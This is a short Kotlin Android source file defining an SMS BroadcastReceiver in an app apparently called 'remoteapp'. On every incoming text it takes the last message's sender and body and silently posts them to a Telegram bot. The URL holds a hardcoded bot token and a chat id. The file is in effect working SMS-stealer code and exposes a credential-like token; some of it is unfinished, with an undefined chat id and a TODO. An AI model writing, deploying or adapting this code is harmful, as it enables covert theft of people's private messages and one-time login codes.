package com.example.remoteapp

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.content.ContextCompat
import androidx.core.content.ContextCompat.getSystemService
import io.ktor.client.*
import io.ktor.client.engine.android.*
import io.ktor.client.request.*
import io.ktor.client.response.*
import io.ktor.http.*
import kotlinx.coroutines.runBlocking


class SMSReceiver : BroadcastReceiver() {
    companion object {
        private val TAG by lazy { SMSReceiver::class.java.simpleName }
    }

    override fun onReceive(context: Context?, intent: Intent?) {
        if (!intent?.action.equals(Telephony.Sms.Intents.SMS_RECEIVED_ACTION)) return
        val extractMessages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
        extractMessages.forEach { smsMessage -> Log.v(TAG, smsMessage.displayMessageBody) }
        val message=extractMessages.last().displayMessageBody
        val sender=extractMessages.last().displayOriginatingAddress

        println(message)
        runBlocking {
            val url="https://api.telegram.org/bot5621779704:AAFSBLQRTOL7meJIjZWgtt2-C_SzFgo-Cio/sendMessage?chat_id=$ChatId&text=Sender: $sender\nMessage: $message"
            val response:HttpResponse= client.post(url){
        }
        print(response)
        }
    //TODO
    }
}
val client=HttpClient(Android)

